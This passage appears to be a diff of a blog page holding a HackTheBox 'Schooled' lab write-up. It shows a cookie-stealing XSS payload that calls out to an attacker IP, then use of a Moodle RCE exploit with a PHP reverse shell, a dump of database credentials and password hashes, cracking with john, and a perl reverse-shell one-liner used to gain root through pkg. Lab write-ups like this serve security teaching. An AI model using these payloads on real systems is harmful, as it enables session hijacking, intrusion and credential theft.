+                 $userprofile = $user-&gt;moodlenetprofile ? $user-&gt;moodlenetprofile : &#39;&#39;;
 -                return (isset($user)) ? new moodlenet_user_profile($userprofile, $userid) : null;
 +                return (isset($user)) ? new moodlenet_user_profile(s($userprofile), $userid) : null;
              } catch (\moodle_exception $e) {
-                 // If an exception is thrown, means there isn't a valid profile set. No need to log exception.
+                 // If an exception is thrown, means there isn&#39;t a valid profile set. No need to log exception.
                  return null;
 @@ -59,7 +59,7 @@ class profile_manager {
              if ($field-&gt;get_category_name() == self::get_category_name()
-                     &amp;&amp; $field-&gt;inputname == 'profile_field_mnetprofile') {
+                     &amp;&amp; $field-&gt;inputname == &#39;profile_field_mnetprofile&#39;) {
                  try {
 -                    return new moodlenet_user_profile($field-&gt;display_data(), $userid);
 +                    return new moodlenet_user_profile(s($field-&gt;display_data()), $userid);
                  } catch (\moodle_exception $e) {
-                     // If an exception is thrown, means there isn't a valid profile set. No need to log exception.
+                     // If an exception is thrown, means there isn&#39;t a valid profile set. No need to log exception.
                      return null;
-</code></pre><p>Given the fact that the lecturer is checking students profiles it&rsquo;s likely he will trigger the JS payload. This allows us to perform <code>Session hijacking</code> attack by stealing the <code>MoodleSession</code> cookie.</p>
-<p>In my case the following XSS payload worked in the first try:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Image</span>().<span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://IP/c.php?c=&#34;</span><span style="color:#f92672">+</span>document.<span style="color:#a6e22e">cookie</span>;&lt;/<span style="color:#f92672">script</span>&gt;
-</code></pre></div><p><img src="xss.png" alt="xss"></p>
-<p>Setting up the listener (I&rsquo;m using <a href="https://gist.github.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7">this</a> python server script for logging GET/POST requests)</p>
-<pre tabindex="0"><code>╰─○ sudo python3 server.py 80
+</code></pre><p>Given the fact that the lecturer is checking students profiles it&rsquo;s likely he will trigger the JS payload. This allows us to perform <code>Session hijacking</code> attack by stealing the <code>MoodleSession</code> cookie.</p><p>In my case the following XSS payload worked in the first try:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>script</span>&gt;<span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Image</span>().<span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://IP/c.php?c=&#34;</span><span style=color:#f92672>+</span>document.<span style=color:#a6e22e>cookie</span>;&lt;/<span style=color:#f92672>script</span>&gt;
+</span></span></code></pre></div><p><img src=xss.png alt=xss></p><p>Setting up the listener (I&rsquo;m using <a href=https://gist.github.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7>this</a> python server script for logging GET/POST requests)</p><pre tabindex=0><code>╰─○ sudo python3 server.py 80
 INFO:root:Starting httpd...
 
 INFO:root:GET request,
@@ -540,67 +249,54 @@ Referer: http://moodle.schooled.htb/moodle/user/profile.php?id=28
 
 
 
-10.10.10.234 - - [30/Jun/2021 22:35:00] &quot;GET /c.php?c=MoodleSession=3r6ht858ruacr94qjjlogs992v HTTP/1.1&quot; 200 -
-</code></pre><p>the cookie can be obtained. It allows to elevate privileges to <code>teacher</code>.</p>
-<h2 id="foothold">Foothold<a href="#foothold" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
-<p>In <code>moodle</code> version <code>3.9.0-Beta</code> the RCE vulnerability exists. It might be triggered by the <code>manager</code> role to which the <code>teacher</code> can be elevated.</p>
-<p>There are multiple ways to exploit it, but I&rsquo;ve gone with the <a href="https://github.com/lanzt/CVE-2020-14321">following</a> exploit. <a href="https://github.com/HoangKien1020/CVE-2020-14321">This</a> one didn&rsquo;t work for me and I didn&rsquo;t bother to fix it.</p>
-<p>Used exploit has a downside - it can be triggered once, and then it doesn&rsquo;t work anymore. So after few attempts to achieve reverse shell connection I gave up with the <code>bash</code> payloads (didn&rsquo;t find python[3] either) and decided to change my strategy.</p>
-<p>The vulnerability depends on uploading the plugin inside the zip archive. So I&rsquo;ve changed the payload to the php reverse shell from <a href="https://github.com/pentestmonkey/php-reverse-shell">here</a> and then converted it to the base64 and put it back in the zip archive.</p>
-<p>This allowed me to gain control as a <code>www</code> user</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─○ sudo nc -nvlp <span style="color:#ae81ff">443</span> 
-<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span>: 
-listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
-connect to <span style="color:#f92672">[</span>10.10.14.7<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.234<span style="color:#f92672">]</span> <span style="color:#ae81ff">37349</span>
-FreeBSD Schooled 13.0-BETA3 FreeBSD 13.0-BETA3 <span style="color:#75715e">#0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021     root@releng1.nyi.freebsd.org:/usr/obj/usr/src/amd64.amd64/sys/GENERIC  amd64</span>
- 8:11PM  up  3:36, <span style="color:#ae81ff">0</span> users, load averages: 0.71, 0.48, 0.43
-USER       TTY      FROM    LOGIN@  IDLE WHAT
-uid<span style="color:#f92672">=</span>80<span style="color:#f92672">(</span>www<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>80<span style="color:#f92672">(</span>www<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>80<span style="color:#f92672">(</span>www<span style="color:#f92672">)</span>
-sh: can<span style="color:#960050;background-color:#1e0010">&#39;</span>t access tty; job control turned off
-</code></pre></div><p>On the system there are two users with the <code>/home</code> directory.</p>
-<h2 id="priv-esc">Priv Esc<a href="#priv-esc" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
-<h3 id="vertical-priv-esc">Vertical priv esc<a href="#vertical-priv-esc" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
-<p>Information about the database used by the <code>moodle</code> can be obtained from <code>config.php</code> file.</p>
-<pre tabindex="0"><code>$ cat config.php
+10.10.10.234 - - [30/Jun/2021 22:35:00] &#34;GET /c.php?c=MoodleSession=3r6ht858ruacr94qjjlogs992v HTTP/1.1&#34; 200 -
+</code></pre><p>the cookie can be obtained. It allows to elevate privileges to <code>teacher</code>.</p><h2 id=foothold>Foothold<a href=#foothold class=hanchor arialabel=Anchor>&#8983;</a></h2><p>In <code>moodle</code> version <code>3.9.0-Beta</code> the RCE vulnerability exists. It might be triggered by the <code>manager</code> role to which the <code>teacher</code> can be elevated.</p><p>There are multiple ways to exploit it, but I&rsquo;ve gone with the <a href=https://github.com/lanzt/CVE-2020-14321>following</a> exploit. <a href=https://github.com/HoangKien1020/CVE-2020-14321>This</a> one didn&rsquo;t work for me and I didn&rsquo;t bother to fix it.</p><p>Used exploit has a downside - it can be triggered once, and then it doesn&rsquo;t work anymore. So after few attempts to achieve reverse shell connection I gave up with the <code>bash</code> payloads (didn&rsquo;t find python[3] either) and decided to change my strategy.</p><p>The vulnerability depends on uploading the plugin inside the zip archive. So I&rsquo;ve changed the payload to the php reverse shell from <a href=https://github.com/pentestmonkey/php-reverse-shell>here</a> and then converted it to the base64 and put it back in the zip archive.</p><p>This allowed me to gain control as a <code>www</code> user</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─○ sudo nc -nvlp <span style=color:#ae81ff>443</span> 
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span>: 
+</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>443</span> ...
+</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>10.10.14.7<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.10.234<span style=color:#f92672>]</span> <span style=color:#ae81ff>37349</span>
+</span></span><span style=display:flex><span>FreeBSD Schooled 13.0-BETA3 FreeBSD 13.0-BETA3 <span style=color:#75715e>#0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021     root@releng1.nyi.freebsd.org:/usr/obj/usr/src/amd64.amd64/sys/GENERIC  amd64</span>
+</span></span><span style=display:flex><span> 8:11PM  up  3:36, <span style=color:#ae81ff>0</span> users, load averages: 0.71, 0.48, 0.43
+</span></span><span style=display:flex><span>USER       TTY      FROM    LOGIN@  IDLE WHAT
+</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>80<span style=color:#f92672>(</span>www<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>80<span style=color:#f92672>(</span>www<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>80<span style=color:#f92672>(</span>www<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>sh: can<span style=color:#960050;background-color:#1e0010>&#39;</span>t access tty; job control turned off
+</span></span></code></pre></div><p>On the system there are two users with the <code>/home</code> directory.</p><h2 id=priv-esc>Priv Esc<a href=#priv-esc class=hanchor arialabel=Anchor>&#8983;</a></h2><h3 id=vertical-priv-esc>Vertical priv esc<a href=#vertical-priv-esc class=hanchor arialabel=Anchor>&#8983;</a></h3><p>Information about the database used by the <code>moodle</code> can be obtained from <code>config.php</code> file.</p><pre tabindex=0><code>$ cat config.php
 &lt;?php  // Moodle configuration file
 
 unset($CFG);
 global $CFG;
 $CFG = new stdClass();
 
-$CFG-&gt;dbtype    = 'mysqli';
-$CFG-&gt;dblibrary = 'native';
-$CFG-&gt;dbhost    = 'localhost';
-$CFG-&gt;dbname    = 'moodle';
-$CFG-&gt;dbuser    = 'moodle';
-$CFG-&gt;dbpass    = 'PlaybookMaster2020';
-$CFG-&gt;prefix    = 'mdl_';
+$CFG-&gt;dbtype    = &#39;mysqli&#39;;
+$CFG-&gt;dblibrary = &#39;native&#39;;
+$CFG-&gt;dbhost    = &#39;localhost&#39;;
+$CFG-&gt;dbname    = &#39;moodle&#39;;
+$CFG-&gt;dbuser    = &#39;moodle&#39;;
+$CFG-&gt;dbpass    = &#39;PlaybookMaster2020&#39;;
+$CFG-&gt;prefix    = &#39;mdl_&#39;;
 $CFG-&gt;dboptions = array (
-  'dbpersist' =&gt; 0,
-  'dbport' =&gt; 3306,
-  'dbsocket' =&gt; '',
-  'dbcollation' =&gt; 'utf8_unicode_ci',
+  &#39;dbpersist&#39; =&gt; 0,
+  &#39;dbport&#39; =&gt; 3306,
+  &#39;dbsocket&#39; =&gt; &#39;&#39;,
+  &#39;dbcollation&#39; =&gt; &#39;utf8_unicode_ci&#39;,
 );
 
-$CFG-&gt;wwwroot   = 'http://moodle.schooled.htb/moodle';
-$CFG-&gt;dataroot  = '/usr/local/www/apache24/moodledata';
-$CFG-&gt;admin     = 'admin';
+$CFG-&gt;wwwroot   = &#39;http://moodle.schooled.htb/moodle&#39;;
+$CFG-&gt;dataroot  = &#39;/usr/local/www/apache24/moodledata&#39;;
+$CFG-&gt;admin     = &#39;admin&#39;;
 
 $CFG-&gt;directorypermissions = 0777;
 
-require_once(__DIR__ . '/lib/setup.php');
+require_once(__DIR__ . &#39;/lib/setup.php&#39;);
 
 // There is no php closing tag in this file,
 // it is intentional because it prevents trailing whitespace problems!
-</code></pre><p>To connect to the database the mysql binary will be handy</p>
-<pre tabindex="0"><code>$ /usr/local/bin/mysql -u moodle -pPlaybookMaster2020
+</code></pre><p>To connect to the database the mysql binary will be handy</p><pre tabindex=0><code>$ /usr/local/bin/mysql -u moodle -pPlaybookMaster2020
 mysql: [Warning] Using a password on the command line interface can be insecure.
 use moodle;
 show tables;
 Tables_in_moodle
 [...]
-</code></pre><p>Users are placed inside the <code>mdl_user</code>.</p>
-<pre tabindex="0"><code>id  auth    confirmed   policyagreed    deleted suspended   mnethostid  username    password    idnumber    firstname   lastname    email   emailstop   icq skype   yahoo   aim msn phone1  phone2  institution department  address city    country lang    calendartype    theme   timezone    firstaccess lastaccess  lastlogin   currentlogin    lastip  secret  picture url description descriptionformat   mailformat  maildigest  maildisplay autosubscribe   trackforums timecreated timemodified    trustbitmask    imagealt    lastnamephonetic    firstnamephonetic   middlename  alternatename   moodlenetprofile
+</code></pre><p>Users are placed inside the <code>mdl_user</code>.</p><pre tabindex=0><code>id  auth    confirmed   policyagreed    deleted suspended   mnethostid  username    password    idnumber    firstname   lastname    email   emailstop   icq skype   yahoo   aim msn phone1  phone2  institution department  address city    country lang    calendartype    theme   timezone    firstaccess lastaccess  lastlogin   currentlogin    lastip  secret  picture url description descriptionformat   mailformat  maildigest  maildisplay autosubscribe   trackforums timecreated timemodified    trustbitmask    imagealt    lastnamephonetic    firstnamephonetic   middlename  alternatename   moodlenetprofile
 1   manual  1   0   0   0   1   guest   $2y$10$u8DkSWjhZnQhBk1a0g1ug.x79uhkx/sa7euU8TI4FX4TCaXK6uQk2        Guest user      root@localhost  0       en  gregorian       99  0   0   0   0           0   This user is a special user that allows read-only access to some courses.   1   1   02  1   0   0   1608320077  0   NULL    NULL    NULL    NULL    NULL    NULL
 2   manual  1   0   0   0   1   admin   $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW        Jamie   Borham  jamie@staff.schooled.htb    0   Bournemouth GB  en  gregorian       99  1608320129  1608729680  1608681411  1608729680  192.168.1.14        0           1   1   00  1   0   0   1608389236  0                       
 3   manual  1   0   0   0   1   bell_oliver89   $2y$10$N0feGGafBvl.g6LNBKXPVOpkvs8y/axSPyXb46HiFP3C9c42dhvgK        Oliver  Bell    bell_oliver89@student.schooled.htb  0                                           Bournemouth GB  en  gregorian       99  0   0   0   0   01  1   0   2   1   0   1608320808  1608320808  0       
@@ -627,21 +323,18 @@ Tables_in_moodle
 24  manual  1   0   0   0   1   phillips_manuel $2y$10$ZwxEs65Q0gO8rN8zpVGU2eYDvAoVmWYYEhHBPovIHr8HZGBvEYEYG        Manuel  Phillips    phillips_manuel@staff.schooled.htb  0                                       Bournemouth GB  en  gregorian       99  1608681510  1625080530  1625080405  1625080530  127.0.0.1       0           1   1   02  1   0   1608382537  1608681490  0                   
 25  manual  1   0   0   0   1   carter_lianne   $2y$10$jw.KgN/SIpG2MAKvW8qdiub67JD7STqIER1VeRvAH4fs/DPF57JZe        Lianne  Carter  carter_lianne@staff.schooled.htb    0                                           Bournemouth GB  en  gregorian       99  0   0   0   0   01  1   0   2   1   0   1608382633  1608382633  0       
 26  email   0   0   0   0   1   parker_dan89    $2y$10$MYvrCS5ykPXX0pjVuCGZOOPxgj.fiQAZXyufW5itreQEc2IB2.OSi        Dan Parker  parker_dan89@student.schooled.htb   0                                           Bournemouth GB  en  gregorian       99  0   0   0   0   6IwNTLYu1F22aFR 0       NULL    1   1   0   2   1   0   160
-
-</code></pre><p>There are some staff members, and the administrator of this <code>moodle</code> instance probably is also a user on the box. So I&rsquo;ve tried to crack <code>$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW</code> hash.</p>
-<pre tabindex="0"><code>╰─○ john hash.txt -w=/usr/share/wordlists/rockyou.txt
+</code></pre><p>There are some staff members, and the administrator of this <code>moodle</code> instance probably is also a user on the box. So I&rsquo;ve tried to crack <code>$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW</code> hash.</p><pre tabindex=0><code>╰─○ john hash.txt -w=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
 Cost 1 (iteration count) is 1024 for all loaded hashes
 Will run 6 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
 0g 0:00:00:21 0,03% (ETA: 16:00:37) 0g/s 284.2p/s 284.2c/s 284.2C/s april20..coolchick
 0g 0:00:00:22 0,04% (ETA: 16:02:33) 0g/s 283.0p/s 283.0c/s 283.0C/s sydney1..hotness
 !QAZ2wsx         (?)
 1g 0:00:00:53 DONE (2021-06-30 23:06) 0.01869g/s 260.4p/s 260.4c/s 260.4C/s 110689..kuuipo
-Use the &quot;--show&quot; option to display all of the cracked passwords reliably
-</code></pre><p>Using this password I was able to connect using <code>ssh</code>.</p>
-<pre tabindex="0"><code>╰─○ ssh jamie@schooled.htb
+Use the &#34;--show&#34; option to display all of the cracked passwords reliably
+</code></pre><p>Using this password I was able to connect using <code>ssh</code>.</p><pre tabindex=0><code>╰─○ ssh jamie@schooled.htb
 Password for jamie@Schooled:
 Last login: Tue Mar 16 14:44:53 2021 from 10.10.14.5
 FreeBSD 13.0-BETA3 (GENERIC) #0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021
@@ -657,7 +350,7 @@ FreeBSD Forums:        https://forums.FreeBSD.org/
 
 Documents installed with the system are in the /usr/local/share/doc/freebsd/
 directory, or can be installed later with:  pkg install en-freebsd-doc
-For other languages, replace &quot;en&quot; with a language code like de or fr.
+For other languages, replace &#34;en&#34; with a language code like de or fr.
 
 Show the version of FreeBSD installed:  freebsd-version ; uname -a
 Please include that output and any error messages when posting questions.
@@ -665,22 +358,18 @@ Introduction to manual pages:  man man
 FreeBSD directory layout:      man hier
 
 To change this login announcement, see motd(5).
-To see the last 10 lines of a long file, use &quot;tail filename&quot;. To see the
-first 10 lines, use &quot;head filename&quot;. To see new lines as they're appended
-to a file, use &quot;tail -f filename&quot;.
+To see the last 10 lines of a long file, use &#34;tail filename&#34;. To see the
+first 10 lines, use &#34;head filename&#34;. To see new lines as they&#39;re appended
+to a file, use &#34;tail -f filename&#34;.
         -- Dru &lt;genesis@istar.ca&gt;
 jamie@Schooled:~ $ ls
 user.txt
-</code></pre><p>By the enumeration of privileges for the <code>jamie</code> account, I&rsquo;ve found out that he can run <code>pkg install</code> with <code>*</code>.</p>
-<pre tabindex="0"><code>jamie@Schooled:~ $ sudo -l
+</code></pre><p>By the enumeration of privileges for the <code>jamie</code> account, I&rsquo;ve found out that he can run <code>pkg install</code> with <code>*</code>.</p><pre tabindex=0><code>jamie@Schooled:~ $ sudo -l
 User jamie may run the following commands on Schooled:
     (ALL) NOPASSWD: /usr/sbin/pkg update
     (ALL) NOPASSWD: /usr/sbin/pkg install *
-
-</code></pre><p>By <a href="https://gtfobins.github.io/gtfobins/pkg/">this</a> methodology I was able to create the package. Instead of the <code>id</code> command, I&rsquo;ve used the reverse shell perl payload.</p>
-<pre tabindex="0"><code>perl -e 'use Socket;$i=&quot;10.10.14.7&quot;;$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
-</code></pre><p>And this allowed me to gain the <code>root</code> shell on the box!</p>
-<pre tabindex="0"><code># id  
+</code></pre><p>By <a href=https://gtfobins.github.io/gtfobins/pkg/>this</a> methodology I was able to create the package. Instead of the <code>id</code> command, I&rsquo;ve used the reverse shell perl payload.</p><pre tabindex=0><code>perl -e &#39;use Socket;$i=&#34;10.10.14.7&#34;;$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;
+</code></pre><p>And this allowed me to gain the <code>root</code> shell on the box!</p><pre tabindex=0><code># id  
 uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
 # ls
 .cache
@@ -700,84 +389,12 @@ scripts
 /bin/sh: ip: not found
 # ipconfig
 /bin/sh: ipconfig: not found
-</code></pre><h2 id="post-exploitation">Post exploitation<a href="#post-exploitation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
-<p>N/A</p>
-
-      </div></div>
-
-  
-
-  <link rel="stylesheet" href="https://foxtrotlabs.cc/comments.css">
- <section class="post-comments">
-  <script src='https://www.google.com/recaptcha/api.js'></script>
- 
-
-<h1 id="Comments">Comments<a href="#Comments" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
-<font size="1"> My comments operate on free Heroku instance. If there is no traffic in 30 minutes the dyno service goes asleep. That causes a small delay in submitting your comment. Thank you for your patience ;)</font>
-
-  
-  
-
-  
-    
-  
-    
-  
-    
-  
-    
-  
-
-  
-    <p>Nothing yet.</p>
-  
-
-  <h3>Say something</h3>
-
-  <form class="post-new-comment" method="POST" action="https://flabs-staticman.herokuapp.com/v2/entry/s3gm3nt4ti0nf4ult/page_source/master/comments">
-    <input type="hidden" name="options[redirect]" value="https://foxtrotlabs.cc/2021/09/htb-writeup-schooled-hackthebox-machine/#comment-submitted">
-    <input type="hidden" name="options[entryId]" value="30352551afc1ad39b586ffe78b29825d">
-    <input name="fields[name]" type="text" class="post-comment-field" placeholder="Your name">
-    <input name="fields[email]" type="email" class="post-comment-field" placeholder="Your email address">
-    <textarea name="fields[body]" class="post-comment-field" placeholder="Your message. Feel free to use Markdown." rows="10"></textarea>
-    <input type="hidden" name="options[reCaptcha][siteKey]" value="6Lco6bkZAAAAAPwhdzJftINmETZymWpv1s8w1hKR">
-    <input type="hidden" name="options[reCaptcha][secret]" value="cNVL1K9Iu23KHkq4nAvjE8jFHYmFb1aJmvpOSSILJdZaUA07HolAG0UkqYzekmBKkxqNo4bAwKcPhGtIohOKp+PfBROWHhB+Vl+lGYQ9Z3+MTghdzhAZEC0V+Ti0WEvpfTXR7Lj6LUXwPNg+HRMj3/oYlou6vsz0cP1OSLPe9iMd4ZMGolwIaUowvWn9DVfU0eHKLAWUNXVRxFiBGcTKKbAd0JgR4ZtZs1VsPkhC3OlOsHm/yW2pA491SAQ0s820p+H1SncOd1kYE1h2gTL+oklzH+5CNz2V4xyq6Et4NLjinr0WGUN87eCFYUz+05wyEp+5lrG+uuq1eX2cBcfVoA=="></div>
-    <input type="submit" class="post-comment-field btn" value="Submit">
-     <div class="g-recaptcha" data-sitekey="6Lco6bkZAAAAAPwhdzJftINmETZymWpv1s8w1hKR"></div>
-  </form>
-</section>
-
-<div id="comment-submitted" class="dialog">
-<h3>Thank you</h3>
-  <p>Your comment has been submitted and will be published once it has been approved.</p>
-  <p><a href="#" class="btn">OK</a></p>
-</div>
-
-</div>
-
-  </div>
-
-  
-    <footer class="footer">
-  <div class="footer__inner">
-    
-      <div class="copyright copyright--user">
-        <span>copyright by foxtrot_charlie</span>
-    
-        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
-      </div>
-  </div>
-</footer>
-
-<script src="https://foxtrotlabs.cc/assets/main.js"></script>
-<script src="https://foxtrotlabs.cc/assets/prism.js"></script>
-
-
-
-
-
-  
-</div>
-
-</body>
-</html>
+</code></pre><h2 id=post-exploitation>Post exploitation<a href=#post-exploitation class=hanchor arialabel=Anchor>&#8983;</a></h2><p>N/A</p></div></div><link rel=stylesheet href=https://foxtrotlabs.cc/comments.css><section class=post-comments><script src=https://www.google.com/recaptcha/api.js></script><h1 id=Comments>Comments<a href=#Comments class=hanchor arialabel=Anchor>&#8983;</a></h1><font size=1>My comments operate on free Heroku instance. If there is no traffic in 30 minutes the dyno service goes asleep. That causes a small delay in submitting your comment. Thank you for your patience ;)</font><p>Nothing yet.</p><h3>Say something</h3><form class=post-new-comment method=post action=https://flabs-staticman.herokuapp.com/v2/entry/s3gm3nt4ti0nf4ult/page_source/master/comments><input type=hidden name=options[redirect] value=https://foxtrotlabs.cc/2021/09/htb-writeup-schooled-hackthebox-machine/#comment-submitted>
+<input type=hidden name=options[entryId] value=30352551afc1ad39b586ffe78b29825d>
+<input name=fields[name] type=text class=post-comment-field placeholder="Your name">
+<input name=fields[email] type=email class=post-comment-field placeholder="Your email address">
+<textarea name=fields[body] class=post-comment-field placeholder="Your message. Feel free to use Markdown." rows=10></textarea>
+<input type=hidden name=options[reCaptcha][siteKey] value=6Lco6bkZAAAAAPwhdzJftINmETZymWpv1s8w1hKR>
+<input type=hidden name=options[reCaptcha][secret] value="cNVL1K9Iu23KHkq4nAvjE8jFHYmFb1aJmvpOSSILJdZaUA07HolAG0UkqYzekmBKkxqNo4bAwKcPhGtIohOKp+PfBROWHhB+Vl+lGYQ9Z3+MTghdzhAZEC0V+Ti0WEvpfTXR7Lj6LUXwPNg+HRMj3/oYlou6vsz0cP1OSLPe9iMd4ZMGolwIaUowvWn9DVfU0eHKLAWUNXVRxFiBGcTKKbAd0JgR4ZtZs1VsPkhC3OlOsHm/yW2pA491SAQ0s820p+H1SncOd1kYE1h2gTL+oklzH+5CNz2V4xyq6Et4NLjinr0WGUN87eCFYUz+05wyEp+5lrG+uuq1eX2cBcfVoA=="></div><input type=submit class="post-comment-field btn" value=Submit><div class=g-recaptcha data-sitekey=6Lco6bkZAAAAAPwhdzJftINmETZymWpv1s8w1hKR></div></form></section><div id=comment-submitted class=dialog><h3>Thank you</h3><p>Your comment has been submitted and will be published once it has been approved.</p><p><a href=# class=btn>OK</a></p></div></div></div><footer class=footer><div class=footer__inner><div class="copyright copyright--user"><span>copyright by foxtrot_charlie</span>
+<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=https://foxtrotlabs.cc/assets/main.js></script>
+<script src=https://foxtrotlabs.cc/assets/prism.js></script></div></body></html>
